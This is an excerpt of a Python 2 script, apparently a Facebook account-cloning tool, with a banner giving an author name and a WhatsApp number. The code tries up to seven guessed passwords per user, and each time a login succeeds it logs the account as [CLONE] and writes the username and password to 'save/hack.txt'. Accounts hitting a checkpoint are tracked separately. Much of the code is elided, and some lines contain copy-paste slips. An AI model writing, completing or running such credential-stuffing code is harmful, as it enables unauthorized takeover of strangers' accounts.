...
\x1b[1;93m➣ AUTHOR : Junaid
\x1b[1;95m➣ WHATSAPP : +9203106291197
\x1b[1;96m➣ FACEBOOK : 
\x1b[1;93m➣ BLESSING : Thanks For everything
\x1b[1;94m──────────────────────────────────────────────────────""" 
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[CLONE] ' + user + ' |\x1b[0m ' + p1
                cek = open('save/hack.txt', 'a')
                cek.write(user + '|' + p1 + '\n')
                cek.close()
                oks.append(user + p1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[WAIT] ' + user + ' |\x1b[0m ' + p1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;;92m[CLONE] ' + user + ' |\x1b[0m ' + p2
                    cek = open('save/hack.txt', 'a')
                    cek.write(user + '|' + p2 + '\n')
                    cek.close()
                    oks.append(user + p2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;;93m [WAIT] ' + user + ' |\x1b[0m ' + p2
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;41;97m[CLONE] ' + user + ' |\x1b[0m ' + p3
                        cek = open('save/hack.txt', 'a')
                        cek.write(user + '|' + p3 + '\n')
                        cek.close()
                        oks.append(user + p3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m [WAIT] ' + user + ' |\x1b[0m ' + p3
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[CLONE] ' + user + ' |\x1b[0m ' + p4
                            cek = open('save/hack.txt', 'a')
                            cek.write(user + '|' + p4 + '\n')
                            cek.close()
                            oks.append(user + p4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[WAIT] ' + user + ' |\x1b[0m ' + p4
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[CLONE] ' + user + ' |\x1b[0m ' + p5
                                cek = open('save/hack.txt', 'a')
                                cek.write(user + '|' + p5 + '\n')
                                cek.close()
                                oks.append(user + p5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m [WAIT] ' + user + ' |\x1b[0m ' + p5
                                ...
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[CLONE] ' + user + ' |\x1b[0m ' + p6
                                    cek = open('save/hack.txt', 'a')
                                    cek.write(user + '|' + p6 + '\n')
                                    cek.close()
                                    oks.append(user + p5)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;;93m [JAMES-CP] ' + user + ' |\x1b[0m ' + p6
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[CLONE] ' + user + ' |\x1b[0m ' + p7
                                        cek = open('save/hack.txt', 'a')
                                        cek.write(user + '|' + p7 + '\n')
                                        cek.close()
                                        oks.append(user + p7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[WAIT] ' + user + ' |\x1b[0m ' + p7
                                        cekpoint.append(user + p6)
        except:
            pass
